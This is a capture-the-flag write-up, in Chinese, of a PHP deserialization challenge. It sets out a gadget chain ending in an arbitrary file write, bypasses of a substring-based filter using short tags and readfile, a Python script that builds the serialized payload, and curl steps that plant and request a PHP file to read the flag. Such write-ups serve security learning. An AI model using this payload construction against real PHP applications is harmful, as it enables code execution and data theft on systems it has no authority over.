## 题目原文

> 你好！为了提升内部办公效率，IT 部门上线了新一代‘智慧报表导出系统’。该系统支持通过自定义模板 (.tpl) 进行报表样式定制。最近有安全专家反馈，系统的模板解析引擎在处理旧版元数据时可能存在某种底层的反序列化风险。请作为安全审计员，评估该系统并获取 Flag。

## 题解

### 入口与指纹

`Apache/2.4.54 (Debian)` + `PHP/7.4.33`。首页有两个入口：

- `upload.php`：上传 `.tpl` 模板并解析，页面标注「内容安全审计 v2.3 | PHP标签检测 · 函数黑名单 · 类白名单校验」。
- `sdk.php`：直接下载模板引擎的源码 `SmartReport_Template_SDK.php`（12KB）。

`sdk.php` 等于把整条 POP 链交出来，不需要反编译或猜类名。

### 关键观察

**1. 反序列化的入口是 `.tpl` 的「元数据」。**

上传普通模板 `{{title}}`：

```
警告：模板文件格式正确，但元数据结构未识别。已记录到系统日志。
```

上传 `O:8:"stdClass":0:{}`：

```
违规详情: 根对象类型未授权: [stdClass]，仅允许模板核心类
```

说明服务端会对文件内容做 `unserialize()`，并且有**根对象类白名单**。逐个测试后，`TemplateMetadata` 的根对象会被接受（返回「成功导入并加载」）。

**2. SDK 里有一条现成的析构链。**

```php
class TemplateMetadata {
    public $name; public $version; public $renderer;
    public function __destruct() {
        if ($this->renderer !== null) $this->renderer->warmUp($this->name);
    }
}
class ReportRenderer {
    public $outputFormat; public $postProcessor;
    public function warmUp($templateName) {
        $cacheContent = "<!-- cached: " . $templateName . " -->";
        if ($this->postProcessor !== null) $this->postProcessor->handle($cacheContent);
    }
}
class ExportPostProcessor {
    public $archiver; public $nextProcessor;
    public function handle($content) {
        if ($this->archiver !== null) $this->archiver->archive($content);
        if ($this->nextProcessor !== null) $this->nextProcessor->handle($content);
    }
}
class LocalFileArchiver {
    public $storagePath;
    public function archive($content) {
        file_put_contents($this->storagePath, $content);
    }
}
```

`TemplateMetadata::__destruct` → `ReportRenderer::warmUp` → `ExportPostProcessor::handle` → `LocalFileArchiver::archive` → **任意路径写文件**，内容形如 `<!-- cached: <name> -->`。

**3. 写进去的内容可以夹带 PHP 代码。**

`name` 是我们完全控制的字符串。设 `name = ?><? readfile('/challenge/flag.txt'); ?>`，写出的文件内容就是：

```
<!-- cached: ?><? readfile('/challenge/flag.txt'); ?> -->
```

配合短标签 `<?` 和未被拉黑的 `readfile`，这个文件被请求时就会读出 flag。

**4. 过滤器是「子串匹配」，可以逐项绕开。**

| 检查 | 结果 |
| --- | --- |
| `<?php` | 拦（大写 `<?PHP` 也拦） |
| `<?=` | 拦 |
| `<?` 短标签 | **放行** |
| `system(` / `exec(` / `passthru(` / `popen(` / `include(` / `file_get_contents(` | 拦 |
| **`readfile(`** / `phpinfo(` / `print_r(` / `highlight_file(` | **放行** |
| 序列化内容里的类名/属性名 | 也做子串扫描（`queryExecutor` 触发 `exec()`、`SystemConfig` 触发 `system()`） |

所以 payload 用短标签 + `readfile`，且避免在序列化字符串里出现被禁函数名。

### 利用链

**Step 1：下载 SDK，确认 POP 链。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s "http://$T/sdk.php" -o sdk.php
# TemplateMetadata::__destruct → ReportRenderer::warmUp → ExportPostProcessor::handle → LocalFileArchiver::archive
```

**Step 2：构造序列化对象。**

```python
def s(v):
    b = str(v).encode(); return 's:%d:"%s";' % (len(b), v)
def obj(cls, props):
    return 'O:%d:"%s":%d:{%s}' % (len(cls), cls, len(props),
                                  ''.join(s(k) + v for k, v in props.items()))

name = "?><? readfile('/challenge/flag.txt'); ?>"
arch = obj('LocalFileArchiver', {'storagePath': s('/var/www/html/t15.php'), 'compressor': 'N;'})
pp   = obj('ExportPostProcessor', {'archiver': arch, 'nextProcessor': 'N;'})
rr   = obj('ReportRenderer', {'outputFormat': s('html'), 'postProcessor': pp})
tm   = obj('TemplateMetadata', {'name': s(name), 'version': s('1'), 'renderer': rr})
open('rce.tpl', 'w').write(tm)
```

**Step 3：上传 .tpl。**

```bash
curl -s -F 'template=@rce.tpl;filename=rce.tpl' "http://$T/upload.php"
# 模板元数据已成功导入并加载！
```

上传时 `__destruct` 生成 `/var/www/html/t15.php`。

**Step 4：请求落盘文件。**

```bash
curl -s "http://$T/t15.php"
# <!-- cached: ?>flag{84227ca0-4052-428a-a707-f65d9e15aeae} -->
```

### 复盘

- **`sdk.php` 就是题面提示的实现。** 题目说「旧版元数据存在反序列化风险」，站点直接提供 SDK 下载，等于给了完整的 gadget 清单。
- **类白名单只挡根对象。** `stdClass` 被拒，`TemplateMetadata` 通过；嵌套的 `ReportRenderer / ExportPostProcessor / LocalFileArchiver` 只要不在黑名单里就能串起来。
- **过滤器是子串匹配。** 禁 `<?php`/`<?=` 但不认识短标签 `<?`；禁 `system/exec/popen/include` 但放过 `readfile`。逐个探测函数名比猜规则快。
- **写文件的内容前缀可控。** `<!-- cached: <name> -->` 里 `<name>` 是攻击者可控的，直接夹带 PHP 标签即可。
- **写 `.htaccess` 会自毁现场。** 我一开始把 `storagePath` 指向 `/var/www/html/.htaccess`，写入的 `<!-- cached: ... -->` 不是有效的 Apache 指令，导致整个站点 500；只能重启实例。**写文件前先想清楚目标文件是否会被解析**。
- **上传时的 `__destruct` 与之后的请求是两条时间线。** 本次 flag 是请求落盘文件时读到的，不是上传响应里——两种都可能，落盘后请求最稳。
